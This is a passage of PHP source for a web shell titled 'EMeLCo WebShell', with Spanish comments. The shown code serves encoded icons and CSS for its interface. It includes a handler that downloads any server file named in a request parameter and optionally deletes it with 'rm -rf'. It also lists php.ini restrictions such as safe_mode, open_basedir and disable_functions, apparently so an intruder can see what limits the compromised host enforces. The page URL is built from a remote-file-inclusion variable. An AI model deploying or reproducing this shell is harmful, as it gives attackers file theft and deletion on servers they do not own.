        die(base64_decode('R0lGODlhEAAQANUoAOLp8ElVa0NLXIivyJXK/D5FVYm77N7n7ykxQ5rA1svM0YS8O4C4OJXJSInAP5fLS362N4/ERJLHR5DFRdXb5JbKStXn8HqzM4vAQJ7O+1Jhe1dwkezx9nKsLeXt9XaXtKTR+7HX/PL2+sDf/bvc/avU+7ba/P///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACgALAAAAAAQABAAAAaXwJNwSByijifLqdM5JQaDj/RzQgofjaFn6zFsqsuKJOJojs4ig1fYmWAWEDOJJKpriIzLcEQymUIid05LZnx+ISWBQgNEc3+IiQGLImd9fyUlICAekicfHJWXmSAZHgJCn46QmhkZAKeeHJaIrAQEBwWoIn2rrbYcuScbFCIcWwDIAAccCgioG9AaGgEBAgIFBQiCRdxEQQA7'));
    }elseif($_GET['imagen']=='carpetanueva'){
        die(base64_decode('R0lGODlhEAAQANUnAP/3xffkl+vPMfbgjf3zxP7ztvnpofz36PPbg/vuw+3Oaf/78/HVdvbjqvjqtfz0z/bmsPnqvYvAQI/ERJfLS//204nAP5XJSHqzM5bKSoS8O5LHR362N4C4OJDFReu8Ruu2PeuyN+vGUXKsLeuuMvzurP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACcALAAAAAAQABAAAAaFwNPJRDQJj8ijaTQyJpFFyqX4FC4zm4mlWewSRx6JhtNUiESCtKDbwRQB8EIBsB4umwDRZw8ChUhGXiIHhAkJDgSAQyILjQclJQYBAQMJiiYiFXKQkgMICA6XIg+QkZQIDAwQlx8EnKcMCgoNrAQPDwQJEQ4QDQ0RrH3CIcTFl17IVFXLQQA7'));  
    }elseif($_GET['imagen']=='php'){
        die(base64_decode('R0lGODlhEAAQAMQfAOTq8+3x9pSty/L2+26NyLXa/JTI+lZtjYSiuFJrsUlVa8jj/oW05uft9XqVr9TZ6d3h76zU+93n8FJgebLD00NLXGqIqSkxQz5FVb/e/XuZ0MvM0Z/P+0BXo////////yH5BAEAAB8ALAAAAAAQABAAAAWloCeO5PidnoMggrA6sGN5qCA1AZ43DWAcNI8gsCgWM8gBgwH0UAbGBTJTGFibgYAm0ekmCIJCdSKSdDuBcyehiQzIns6gARkEBHMIe6AQdQAdEA1ogxAdBAB9cQEAD4CMEA9sABUiAoBqD2sEHBKVHg0ECVxeBAwGBhIYIhQeVAURERyzqAGrHhYPdjwAvQASARsXIg4HxhMTCgoVFRgYF3Al0iQhADs='));  
    }elseif($_GET['imagen']=='derecha'){
        die(base64_decode('R0lGODlhEAAQAMQfAJLNW3aXtMfj/pfL/OTr9IivyMvM0Vdwkb7e/UpXbfP2+azU+9Xo9Ovx9u32/mGNRIm77OPx/rXZ/H6xW1Jhe6/S5ERNX5rA1qjL3tvj6ykxQz9GVqDP+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWYoCeO5PidHlNV2HUVRSAHHloxRKM3RE9Ah5qn0hAYjYikAwIUYRRHAaKjdCgoogv0OO1IvtfstkPuALyLsKcAnQLegEknnRCxk4/J5D15CAh1HgENSWVmDxEcBBYig0kMEREdiBwDi42EXwsLHYkDAxkbjQoImgsclZ8Noh4HGQo8Pj0ZDQYajQe5FBQJCRYWGxsaWCXFJSEAOw=='));  
    }elseif($_GET['imagen']=='izquierda'){
        die(base64_decode('R0lGODlhEAAQAMQfAHaXtJLNW5fL/OTs9YivyMfj/tXb5Fdwkb3e/anT+0lVa/P2+dTn9Ovx9u32/mGNRIm77LXZ/H6xW1Jhe+Px/rTR4ENLXJrA1qjL3uDo7ykxQz5FVZ/P+2OPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWaoCeO5PidHlNV2HURBCADHloxQ6M3Qz9Ah5qn0igYjYikAwIUYRbHQieJcDgWE9EFauxMEZEwVsvtBLxeRmLsIUAfkoD8TFkrRG4EXC6RdOoDdx4ADUkPAQ9oFBwDFiKESRGJFBQFHBwZjoOFYQkdlhwCAhkbjwtgEQmql6INpR4HBgs8Phm2DRUajwe8ExMKChbCGxpZJcclIQA7'));      
    }elseif($_GET['imagen']=='copiar'){
        die(base64_decode('R0lGODlhEAAQAMQfAHKQruzx9sfj/uXt9vL2+tXb5MHU4arT+7zd/YmwylVri5XK/IO76EhUaa/S5bPZ/Ha36VRie5/E2Ft6nt/o7ykxQ0FIVz1EVajL332hvNfn8HyjwI7B76HQ+////////yH5BAEAAB8ALAAAAAAQABAAAAWToCeO42een2c4jpRkAOChpudowxDk3FTWjoFAsGq9YrMUhiBg4XQ8X0rC5ASHAgSBw1CIEkzGEqslELwesIBBHSIQjwchItoEEAz1+3E4EBoiAHcQenwHHQOAHgAECBB2e4eIihMFBAaCcIcLCxQWgQoKEYyaHZwBFyQilQQ5FBQBBhVJNQChEQ0NFhcVdCiqwB4hADs='));      
    }elseif($_GET['imagen']=='comprimir'){
        die(base64_decode('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAKQSURBVDjLbZNNaJxVFIafe7/5KTPzpUloNK0tIsowCtbiQgRRQReudCMVqYrdiLgQ01UrWUgXXZQumoU2myyKii66dOFCEUo3IiL+VRMFHactYpsMmsy0mbnnx8X8tEn7wuHAudyH97zcG9wdgKWl9zNgl7vvrVar51T1PndHVQHDzBCRFGNhqd1ePXb06PF1gALAhbONF+7PanPtymtP9G2iVK3WmJjYibtjZuNupsWVlYtviaRTwABw4WzjEPDRVGMy/vt3QLpCu73G2toqZoKZE2Mkz3PyfBKxgKplDFUA3rz7wL5Y2lnigdrHiDhuRlaoYJslrv3cWb7cfehka/3BxUY93+EGqolbAU/tqz+K2V/MzFQAHZYQ4146v55v/NPd81UxL6uKQgyY2RgQB025fOUPCC9COAjhJVqt38BlcKpKb/M65kbq9YfB3nQAGOVSxqXWCXDBSZTLBWAAMDOKsYibYURE0naAMjOzC5gc2Pc0vDwApJTQGx3UDJHNLQ7GK1xq/Q7hFQivQjzMn82LY4CqhiwWw8BBQNW2OxBK5Yxm812whNNnx5YVtBBkoxICkLqYbcugt9Fh9+xj4/RHtblxA7EMVZsOYZC+qqMqWwBHfvr829OjgRNIWkIsIhb54cr+r7Ms+3Bqanr0GjHzm4AnDy8vAAujwfz83NTs7O7z3W7nYTOjH3uPp7RuWZYNHdhtDrZIVda/8+fPWa06nfWvfjJxdfFTEd2zvPzLZyn1CCHSrx954/UPWi8DC2H0G2/VM8ebzeceqd375fer/9WvnTgDVET0oLsWzJDmPe/lzx64K//ix43WHQH1t1fmgLkC/TNPy8lFM4vuWhGx6G72TXX+UAqVd4DT/wMfm3vSJoP5ygAAAABJRU5ErkJggg=='));      
    }else{
        die();
    }

// Mostramos el css, igual que con las imagenes
}elseif ($_GET['w']=='css'){
    Header('Content-type: text/css');
    die(base64_decode('Ym9keXsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjRUNGMUVGOw0KICAgIGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7DQp9DQp0YWJsZXsNCiAgICBmb250LXNpemU6IDEycHg7DQogICAgY29sb3I6ICM4QjgzNzg7DQogICAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsNCiAgICBtYXJnaW4tbGVmdDogYXV0bzsNCiAgICBtYXJnaW4tcmlnaHQ6IGF1dG87DQp9DQp0ZHsNCiAgICBwYWRkaW5nLXJpZ2h0OjEwcHg7DQogICAgcGFkZGluZy1sZWZ0OjEwcHg7DQogICAgYm9yZGVyOiAxcHggZGFzaGVkICNCREI1QUY7DQp9DQouY29udGVuZWRvcnsNCiAgICBib3JkZXI6IDJweCBzb2xpZCAjMzMzMzMzOw0KICAgIHBhZGRpbmc6IDElIDIlIDIlIDElOw0KICAgIG1hcmdpbjogMCBhdXRvIDAgYXV0bzsNCiAgICBib3JkZXItY29sb3I6ICNDREM1QkYNCn0NCi5jb250ZW5lZG9yZ3JhbmRlew0KICAgIGJhY2tncm91bmQtY29sb3I6ICNFQkVDRTQ7DQogICAgZm9udC1zaXplOiAxMnB4Ow0KICAgIGNvbG9yOiAjOEI4Mzc4Ow0KICAgIG1hcmdpbjoyJSBhdXRvIDIlIDIlOw0KICAgIHdpZHRoOjgwJTsNCiAgICBib3JkZXI6IDFweCBkYXNoZWQgI0RERDVDRjsNCn0NCi5uew0KICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KICAgIGNvbG9yOiAjQ0QyNjI2Ow0KfQ0KLnN7DQogICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQogICAgY29sb3I6ICM4QUJEMjI7DQp9DQouaW5saW5lew0KICAgIGRpc3BsYXk6aW5saW5lOw0KfQ0KLmZ7DQogICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQogICAgZGlzcGxheTogaW5saW5lOw0KICAgIGNvbG9yOiAjOEI4ODc4Ow0KfQ0KLmFjew0KICAgIHRleHQtYWxpZ246cmlnaHQ7DQp9DQouYWl7DQogICAgYm9yZGVyOiBub25lOw0KfQ0KaDJ7DQogICAgZGlzcGxheTppbmxpbmU7DQogICAgY29sb3I6ICNFRTc2MDA7DQogICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQpoMXsNCiAgICBjb2xvcjogI0VFNzYwMDsNCiAgICBmb250LXdlaWdodDogYm9sZDsNCiAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphew0KICAgIGNvbG9yOiM4MzhCOEI7DQp9DQphLnNpbnN1YnJheWFkb3sNCiAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphOmhvdmVyew0KICAgIGZvbnQtc2l6ZToxMDUlOw0KICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KfQ0KdGV4dGFyZWE6Zm9jdXMsIHRleHRhcmVhOmhvdmVyLCBpbnB1dDpob3ZlciwgaW5wdXQ6Zm9jdXMgew0KICAgIGJvcmRlcjogMnB4IHNvbGlkICNFRTc2MjE7DQp9DQouaGVhZG9jdWx0b3sNCiAgICAvKmRpc3BsYXk6bm9uZTsqLw0KICAgIHBvc2l0aW9uOiBmaXhlZDsNCiAgICB0b3A6MDsNCiAgICB3aWR0aDogMTclOw0KICAgIHBhZGRpbmc6IDAgMCAwIDA7DQogICAgcmlnaHQ6IDA7DQp9DQovKiBFc3RpbG8gcGFyYSBlbCBwaHBpbmZvICovDQojcGhwaW5mbyB7d2lkdGg6IDEwMCU7fQ0KI3BocGluZm8gYm9keSwgI3BocGluZm8gdGQsICNwaHBpbmZvIHRoLCAjcGhwaW5mbyBoMSwgI3BocGluZm8gaDIge2ZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmO30NCiNwaHBpbmZvIHByZSB7bWFyZ2luOiAwcHg7IGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7fQ0KI3BocGluZm8gYSwgI3BocGluZm8gYTpsaW5rLCAjcGhwaW5mbyBhOmhvdmVyIHtjb2xvcjogI0VFNzYwMDsgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgZm9udC1zaXplOjEwMCU7fQ0KI3BocGluZm8gLmUge2JhY2tncm91bmQtY29sb3I6ICNFQkVDRTQ7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogIzhCODM3ODt9DQojcGhwaW5mbyAuaCB7YmFja2dyb3VuZC1jb2xvcjogI0VDRjFFRjsgZm9udC13ZWlnaHQ6IGJvbGQ7IGNvbG9yOiAjOEI4Mzc4O30NCiNwaHBpbmZvIC52IHtiYWNrZ3JvdW5kLWNvbG9yOiAjRUNGMUVGOyBjb2xvcjogIzhCODM3ODt9DQojcGhwaW5mbyB0ZCB7Zm9udC1zaXplOiAxMDAlO30NCi5jZW50ZXIge3RleHQtYWxpZ246IGNlbnRlcjt9DQojcGhwaW5mbyAuY2VudGVyIHRhYmxlIHsgbWFyZ2luLWxlZnQ6IGF1dG87IG1hcmdpbi1yaWdodDogYXV0bzsgdGV4dC1hbGlnbjogbGVmdDt9DQojcGhwaW5mbyAuY2VudGVyIHRoIHsgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7IH0NCiNwaHBpbmZvIHRkIHt2ZXJ0aWNhbC1hbGlnbjogYmFzZWxpbmU7fQ0KI3BocGluZm8gdGgge2JvcmRlcjogMnB4IGRhc2hlZCAjQkRCNUFGO30NCiNwaHBpbmZvIGgxIHtmb250LXNpemU6IDE1MCU7fQ0KI3BocGluZm8gaDIge2ZvbnQtc2l6ZTogMTI1JTt9DQojcGhwaW5mbyAucCB7dGV4dC1hbGlnbjogbGVmdDt9DQojcGhwaW5mbyAudnIge2JhY2tncm91bmQtY29sb3I6ICNjY2NjY2M7IHRleHQtYWxpZ246IHJpZ2h0OyBjb2xvcjogIzAwMDAwMDt9DQojcGhwaW5mbyBpbWcge2Zsb2F0OiByaWdodDsgYm9yZGVyOiAwcHg7fQ0KI3BocGluZm8gaHIge3dpZHRoOiA2MDBweDsgYmFja2dyb3VuZC1jb2xvcjogI2NjY2NjYzsgYm9yZGVyOiAwcHg7IGhlaWdodDogMXB4OyBjb2xvcjogIzAwMDAwMDt9'));

// Esto es para descargar archivos. Va arriba porque no se puede mandar nada antes
}elseif (( $_GET['w'] == 'descargar' ) and (( $archivo = leer_archivo($_REQUEST['ruta'] ))!==FALSE)){
    header('Content-type: application/force-download');
    header('Content-Disposition: attachment; filename="'.urlencode(basename($_REQUEST['ruta']))."\"\n");
    if($_GET['borrar']){
        unlink($_REQUEST['ruta']) or shell('rm -rf '.escapeshellarg($_REQUEST['ruta']));
    }
    die($archivo);
}

// Mandamos el principio del html y el css
echo'
<html>
<head>
    <title>EMeLCo WebShell</title>
    <LINK href="'.$rfiurl.'w=css" rel="stylesheet" type="text/css">
</head>
<body'.(($_COOKIE['lateral']=='OFF')?' onload=ocultar() ':'').'>
    <div class="headoculto contenedorgrande contenedor" id="headoculto">
        <div style="float:left;width:10%;height:100%; position:relative; top:50%;">
            <br><br><br><br>
            <script>
            function ocultar(){
                document.cookie = "lateral=OFF; path=/";
                document.getElementById("flechaizquierda").style.display="";
                document.getElementById("flechaderecha").style.display="none";
                document.getElementById("headoculto").style.right="-16%";
                document.getElementById("contenedorgrande").style.margin="2% auto 2% auto";
                document.getElementById("contenedorabajo").style.margin="2% auto 2% auto";
            }
            function mostrar(){
                document.cookie = "lateral=ON; path=/";
                document.getElementById("flechaizquierda").style.display="none";
                document.getElementById("flechaderecha").style.display="";
                document.getElementById("headoculto").style.right="0";
                document.getElementById("contenedorgrande").style.margin="2% auto 2% 2%";
                document.getElementById("contenedorabajo").style.margin="2% auto 2% 2%";
            }
            </script>
            <img src="'.$rfiurl.'w=img&imagen=derecha" alt="&gt; &gt;" id="flechaderecha" onclick="ocultar();">
            <img src="'.$rfiurl.'w=img&imagen=izquierda" style="display:none;" id="flechaizquierda" alt="&lt; &lt;" onclick="mostrar();">
        </div>
        
        <div style="float:right; width: 90%; margin: auto 0 auto 0; overflow:auto;">'.mostrar_informacion().'
        </div>
    </div>
    <div class="contenedorgrande" id="contenedorgrande">
    <div class="contenedor">
';


switch($_GET['w']){
    
    /* Mostramos las directivas mas importantes de php.ini y su explicación */
    case 'directivas';
        
        /* Creamos un array con todas las directivas y su descripcion */
        
        //safe mode http://ar2.php.net/manual/en/ini.sect.safe-mode.php
        $functions[]=array('<h2>Safe-Mode</h2>','<a href="http://ar2.php.net/manual/en/ini.sect.safe-mode.php">http://ar2.php.net/manual/en/ini.sect.safe-mode.php</a>');
        $functions[]=leerconfig('safe_mode',' Whether to enable PHP&#039;s safe mode. If PHP is compiled with --enable-safe-mode then defaults to On, otherwise Off.');
        $functions[]=leerconfig('safe_mode_gid',' By default, Safe Mode does a UID compare check when opening files. If you want to relax this to a GID compare, then turn on safe_mode_gid. Whether to use UID (FALSE) or GID (TRUE) checking upon file access. ');
        $functions[]=leerconfig('safe_mode_include_dir',' UID/GID checks are bypassed when including files from this directory and its subdirectories (directory must also be in include_path or full path must including). As of PHP 4.2.0, this directive can take a colon (semi-colon on Windows) separated path in a fashion similar to the include_path directive, rather than just a single directory. The restriction specified is actually a prefix, not a directory name. This means that &quot;safe_mode_include_dir = /dir/incl&quot; also allows access to &quot;/dir/include&quot; and &quot;/dir/incls&quot; if they exist. When you want to restrict access to only the specified directory, end with a slash. For example: &quot;safe_mode_include_dir = /dir/incl/&quot; If the value of this directive is empty, no files with different UID/GID can be included in PHP 4.2.3 and as of PHP 4.3.3. In earlier versions, all files could be included. ');
        $functions[]=leerconfig('safe_mode_exec_dir',' If PHP is used in safe mode, system() and the other functions executing system programs  refuse to start programs that are not in this directory. You have to use / as directory separator on all environments including Windows. ');
        $functions[]=leerconfig('safe_mode_allowed_env_vars',' Setting certain environment variables may be a potential security breach. This directive contains a comma-delimited list of prefixes. In Safe Mode, the user may only alter environment variables whose names begin with the prefixes supplied here. By default, users will only be able to set environment variables that begin with PHP_  (e.g. PHP_FOO=BAR).     Note: If this directive is empty, PHP will let the user modify ANY environment variable! ');
        $functions[]=leerconfig('safe_mode_protected_env_vars',' This directive contains a comma-delimited list of environment variables that the end user won&#039;t be able to change using putenv(). These variables will be protected even if safe_mode_allowed_env_vars is set to allow to change them. ');
        $functions[]=leerconfig('open_basedir',' Limit the files that can be opened by PHP to the specified directory-tree, including the file itself. This directive is NOT affected by whether Safe Mode is turned On or Off. When a script tries to open a file with, for example, fopen() or gzopen(), the location of the file is checked. When the file is outside the specified directory-tree, PHP will refuse to open it. All symbolic links are resolved, so it&#039;s not possible to avoid this restriction with a symlink. If the file doesn&#039;t exist then the symlink couldn&#039;t be resolved and the filename is compared to (a resolved) open_basedir. The special value . indicates that the working directory of the script will be used as the base-directory. This is, however, a little dangerous as the working directory of the script can easily be changed with chdir(). In httpd.conf, open_basedir can be turned off (e.g. for some virtual hosts) the same way as any other configuration directive with &quot;php_admin_value open_basedir none&quot;. Under Windows, separate the directories with a semicolon. On all other systems, separate the directories with a colon. As an Apache module, open_basedir paths from parent directories are now automatically inherited. The restriction specified with open_basedir is actually a prefix, not a directory name. This means that &quot;open_basedir = /dir/incl&quot; also allows access to &quot;/dir/include&quot; and &quot;/dir/incls&quot; if they exist. When you want to restrict access to only the specified directory, end with a slash. For example: open_basedir = /dir/incl/ The default is to allow all files to be opened.      Note: As of PHP 5.3.0 open_basedir can be tightened at run-time. This means that if open_basedir is set to /www/ in php.ini a script can tighten the configuration to /www/tmp/ at run-time with ini_set() ');
        $functions[]=leerconfig('disable_functions',' This directive allows you to disable certain functions for security reasons. It takes on a comma-delimited list of function names. disable_functions is not affected by Safe Mode.   This directive must be set in php.ini For example, you cannot set this in httpd.conf. ');
        $functions[]=leerconfig('disable_classes',' This directive allows you to disable certain classes for security reasons. It takes on a comma-delimited list of class names. disable_classes is not affected by Safe Mode.   This directive must be set in php.ini For example, you cannot set this in httpd.conf. ');
        
        //errores http://ar2.php.net/manual/en/errorfunc.configuration.php
        $functions[]=array('<h2>Errores</h2>','<a href="http://ar2.php.net/manual/en/errorfunc.configuration.php">http://ar2.php.net/manual/en/errorfunc.configuration.php</a>');
        $functions[]=leerconfig('log_errors',' Tells whether script error messages should be logged to the server&#039;s error log or error_log. This option is thus server-specific.    Note: You&#039;re strongly advised to use error logging in place of error displaying on production web sites. ');
        $functions[]=leerconfig('log_errors_max_len',' Set the maximum length of log_errors in bytes. In error_log information about the source is added. The default is 1024 and 0 allows to not apply any maximum length at all. This length is applied to logged errors, displayed errors and also to $php_errormsg.      When an integer is used, the value is measured in bytes. Shorthand notation, as described in this FAQ, may also be used. ');
        $functions[]=leerconfig('error_log',' Name of the file where script errors should be logged. The file should be writable by the web server&#039;s user. If the special value syslog is used, the errors are sent to the system logger instead. On Unix, this means syslog(3) and on Windows NT it means the event log. The system logger is not supported on Windows 95. See also: syslog(). If this directive is not set, errors are sent to the SAPI error logger. For example, it is an error log in Apache or stderr in CLI.');
        $functions[]=leerconfig('error_reporting',' Set the error reporting level. The parameter is either an integer representing a bit field, or named constants. The error_reporting levels and constants are described in Predefined Constants, and in php.ini. To set at runtime, use the error_reporting() function. See also the display_errors directive. In PHP 4 and PHP 5 the default value is E_ALL & ~E_NOTICE. This setting does not show E_NOTICE level errors. You may want to show them during development. ');
        
        //Nucleo http://ar2.php.net/manual/en/ini.core.php
        $functions[]=array('<h2>Lenguaje</h2>','<a href="http://ar2.php.net/manual/en/ini.core.php">http://ar2.php.net/manual/en/ini.core.php</a>');
        $functions[]=leerconfig('short_open_tag',' Tells whether the short form (&lt;? ?&gt; ) of PHP&#039;s open tag should be allowed. If you want to use PHP in combination with XML, you can disable this option in order to use &lt;?xml ?&gt;  inline. Otherwise, you can print it with PHP, for example: &lt;?php echo &#039;&lt;?xml version=&quot;1.0&quot;?&gt;&#039;; ?&gt; . Also if disabled, you must use the long form of the PHP open tag (&lt;?php ?&gt; ).    Note: This directive also affects the shorthand &lt;?= , which is identical to &lt;? echo . Use of this shortcut requires short_open_tag to be on. ');
        $functions[]=leerconfig('asp_tags',' Enables the use of ASP-like &lt;% %&gt; tags in addition to the usual &lt;?php ?&gt; tags. This includes the variable-value printing shorthand of &lt;%= $value %&gt;. For more information, see Escaping from HTML. ');
        
        //Limite de recursos http://ar2.php.net/manual/en/ini.core.php
        $functions[]=array('<h2>Limite de recursos</h2>','<a href="http://ar2.php.net/manual/en/ini.core.php">http://ar2.php.net/manual/en/ini.core.php</a>');
        $functions[]=leerconfig('memory_limit',' This sets the maximum amount of memory in bytes that a script is allowed to allocate. This helps prevent poorly written scripts for eating up all available memory on a server. Note that to have no memory limit, set this directive to -1. Prior to PHP 5.2.1, in order to use this directive it had to be enabled at compile time by using -enable-memory-limit in the configure line. This was also required to define the functions memory_get_usage() and memory_get_peak_usage(). When an integer is used, the value is measured in bytes. Shorthand notation, as described in this FAQ, may also be used. ');
        
        //Manejo de datos http://ar2.php.net/manual/en/ini.core.php
        $functions[]=array('<h2>Manejo de datos</h2>','<a href="http://ar2.php.net/manual/en/ini.core.php">http://ar2.php.net/manual/en/ini.core.php</a>');
        $functions[]=leerconfig('register_globals',' Whether or not to register the EGPCS (Environment, GET, POST, Cookie, Server) variables as global variables. As of » PHP 4.2.0, this directive defaults to off. Please read the security chapter on Using register_globals for related information. Please note that register_globals cannot be set at runtime (ini_set()). Although, you can use .htaccess if your host allows it as described above. An example .htaccess entry: php_flag register_globals off .    Note: register_globals is affected by the variables_order directive. ');
        $functions[]=leerconfig('post_max_size','Sets max size of post data allowed. This setting also affects file upload. To upload large files, this value must be larger than upload_max_filesize.   If memory limit is enabled by your configure script, memory_limit also affects file uploading. Generally speaking, memory_limit should be larger than post_max_size .  When an integer is used, the value is measured in bytes. Shorthand notation, as described in this FAQ, may also be used.   If the size of post data is greater than post_max_size, the $_POST and $_FILES  superglobals  are empty. This can be tracked in various ways, e.g. by passing the $_GET variable to the script processing the data, i.e. &lt;form action=&quot;edit.php?processed=1&quot;&gt;, and then checking if $_GET[&#039;processed&#039;] is set.');
        $functions[]=leerconfig('gpc_order',' Set the order of GET/POST/COOKIE variable parsing. The default setting of this directive is "GPC". Setting this to "GP", for example, will cause PHP to completely ignore cookies and to overwrite any GET method variables with POST-method variables of the same name.    Note: This option is not available in PHP 4. Use variables_order instead. ');
        $functions[]=leerconfig('auto_prepend_file',' Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require() function, so include_path is used. The special value none disables auto-prepending.');
        $functions[]=leerconfig('auto_append_file',' Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require() function, so include_path is used. The special value none disables auto-appending.    Note: If the script is terminated with exit(), auto-append will not occur. ');
        $functions[]=leerconfig('default_charset',' As of 4.0.0, PHP always outputs a character encoding by default in the Content-type: header. To disable sending of the charset, simply set it to be empty. ');
        $functions[]=leerconfig('allow_webdav_methods',' Allow handling of WebDAV http requests within PHP scripts (eg. PROPFIND, PROPPATCH, MOVE, COPY, etc.). This directive does not exist as of PHP 4.3.2. If you want to get the post data of those requests, you have to set  always_populate_raw_post_data as well. ');

        //Rutas y carpetas http://ar2.php.net/manual/en/ini.core.php
        $functions[]=array('<h2>Rutas y carpetas</h2>','<a href="http://ar2.php.net/manual/en/ini.core.php">http://ar2.php.net/manual/en/ini.core.php</a>');
        $functions[]=leerconfig('include_path',' Specifies a list of directories where the require(), include(), fopen(), file(), readfile() and file_get_contents()  functions look for files. The format is like the system&#039;s PATH environment variable: a list of directories separated with a colon in Unix or semicolon in Windows. ');
        $functions[]=leerconfig('doc_root',' PHP&#039;s &quot;root directory&quot; on the server. Only used if non-empty. If PHP is configured with safe mode, no files outside this directory are served. If PHP was not compiled with FORCE_REDIRECT, you should  set doc_root if you are running PHP as a CGI under any web server (other than IIS). The alternative is to use the  cgi.force_redirect configuration below. ');
        $functions[]=leerconfig('user_dir',' The base name of the directory used on a user&#039;s home directory for PHP files, for example public_html.');
        $functions[]=leerconfig('extension_dir',' In what directory PHP should look for dynamically loadable extensions. See also: enable_dl, and dl(). ');
        $functions[]=leerconfig('extension',' Which dynamically loadable extensions to load when PHP starts up.');
        $functions[]=leerconfig('zend_extension',' Absolute path to dynamically loadable Zend extension (for example APD) to load when PHP starts up. ');
        $functions[]=leerconfig('zend_extension_debug',' Variant of zend_extension  for extensions compilled with debug info. ');
        $functions[]=leerconfig('zend_extension_debug_ts',' Variant of zend_extension  for extensions compilled with debug info and thread safety. ');
        $functions[]=leerconfig('zend_extension_ts',' Variant of zend_extension  for extensions compilled with thread safety. ');
        $functions[]=leerconfig('cgi.force_redirect',' cgi.force_redirect is necessary to provide security running PHP as a CGI under most web servers. Left undefined, PHP turns this on by default. You can turn it off at your own risk.    Note: Windows Users: You can safely turn this off for IIS, in fact, you must. To get OmniHTTPD or Xitami to work you must turn it off. ');
        
        //Subida de archivos http://ar2.php.net/manual/en/ini.core.php
        $functions[]=array('<h2>Subida de archivos</h2>','<a href="http://ar2.php.net/manual/en/ini.core.php">http://ar2.php.net/manual/en/ini.core.php</a>');
        $functions[]=leerconfig('file_uploads',' Whether or not to allow HTTP file uploads. See also the upload_max_filesize, upload_tmp_dir, and post_max_size directives. When an integer is used, the value is measured in bytes. Shorthand notation, as described in this FAQ, may also be used. ');
        $functions[]=leerconfig('upload_tmp_dir','The temporary directory used for storing files when doing file upload. Must be writable by whatever user PHP is running as. If not specified PHP will use the system&#039;s default. ');
        $functions[]=leerconfig('upload_max_filesize',' The maximum size of an uploaded file. When an integer is used, the value is measured in bytes. Shorthand notation, as described in this FAQ, may also be used. ');
        
        //SQL http://ar2.php.net/manual/en/ini.core.php
        $functions[]=array('<h2>SQL</h2>','<a href="http://ar2.php.net/manual/en/ini.core.php">http://ar2.php.net/manual/en/ini.core.php</a>');
        $functions[]=leerconfig('sql.safe_mode','If turned on, database connect functions that specify default values will use those values in place of supplied arguments. For default values see connect function documentation for the relevant database. ');
        
        //Ejecución http://ar2.php.net/manual/en/info.configuration.php
        $functions[]=array('<h2>Ejecuci&oacute;n</h2>','<a href="http://ar2.php.net/manual/en/info.configuration.php">http://ar2.php.net/manual/en/info.configuration.php</a>, <a href="http://ar2.php.net/manual/en/filesystem.configuration.php">http://ar2.php.net/manual/en/filesystem.configuration.php</a>');
        $functions[]=leerconfig('enable_dl',' This directive is really only useful in the Apache module version of PHP. You can turn dynamic loading of PHP extensions with dl() on and off per virtual server or per directory. The main reason for turning dynamic loading off is security. With dynamic loading, it&#039;s possible to ignore all open_basedir restrictions. The default is to allow dynamic loading, except when using safe mode. In safe mode, it&#039;s always impossible to use dl().');
        $functions[]=leerconfig('max_execution_time',' This sets the maximum time in seconds a script is allowed to run before it is terminated by the parser. This helps prevent poorly written scripts from tying up the server. The default setting is 30. When running PHP from the command line the default setting is 0. The maximum execution time is not affected by system calls, stream operations etc. Please see the set_time_limit() function for more details. You can not change this setting with ini_set() when running in safe mode. The only workaround is to turn off safe mode or by changing the time limit in the php.ini. Your web server can have other timeout configurations that may also interrupt PHP execution. Apache has a Timeout directive and IIS has a CGI timeout function. Both default to 300 seconds. See your web server documentation for specific details.');
        $functions[]=leerconfig('magic_quotes_gpc',' Sets the magic_quotes state for GPC (Get/Post/Cookie) operations. When magic_quotes are on, all &#039; (single-quote), &quot; (double quote), \ (backslash) and NUL&#039;s are escaped with a backslash automatically.    Note: In PHP 4, also $_ENV variables are escaped.    Note: If the magic_quotes_sybase directive is also ON it will completely override magic_quotes_gpc. Having both directives enabled means only single quotes are escaped as &#039;&#039;. Double quotes, backslashes and NUL&#039;s will remain untouched and unescaped. ');
        $functions[]=leerconfig('magic_quotes_runtime','If magic_quotes_runtime  is enabled, most functions that return data from any sort of external source including databases and text files will have quotes escaped with a backslash. If magic_quotes_sybase  is also on, a single-quote is escaped with a single-quote instead of a backslash. ');
        $functions[]=leerconfig('allow_url_fopen',' This option enables the URL-aware fopen wrappers that enable accessing URL object like files. Default wrappers are provided for the access of remote files  using the ftp or http protocol, some extensions like zlib may register additional wrappers.    Note: This setting can only be set in php.ini due to security reasons.    Note: This option was introduced immediately after the release of version 4.0.3. For versions up to and including 4.0.3 you can only disable this feature at compile time by using the configuration switch --disable-url-fopen-wrapper . ');
        $functions[]=leerconfig('allow_url_include',' This option allows the use of URL-aware fopen wrappers with the following functions: include(), include_once(), require(), require_once().    Note: This setting requires allow_url_fopen to be on. ');
